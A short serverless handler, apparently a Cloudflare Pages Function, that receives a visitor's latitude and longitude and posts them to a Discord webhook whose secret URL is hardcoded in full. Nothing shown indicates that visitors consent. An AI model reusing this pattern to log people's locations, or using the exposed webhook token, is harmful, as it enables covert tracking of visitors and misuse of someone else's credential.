export async function onRequestPost({ request }) {
  try {
    const data = await request.json();
    const { lat, lon } = data;

    if (!lat || !lon) {
      return new Response("Missing data", { status: 400 });
    }

    const payload = {
      content: `🌍 New visitor location:\nLatitude: ${lat}\nLongitude: ${lon}`
    };

    await fetch("https://discord.com/api/webhooks/1390808867226783775/JMh8swFZEZli3sqVhR13DkXddzqjipFqIInHgHRqCnSd9z9M_DGHd68mUZDsP0l4R3kY", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    return new Response("Logged", { status: 200 });
  } catch (err) {
    return new Response("Error logging location", { status: 500 });
  }
}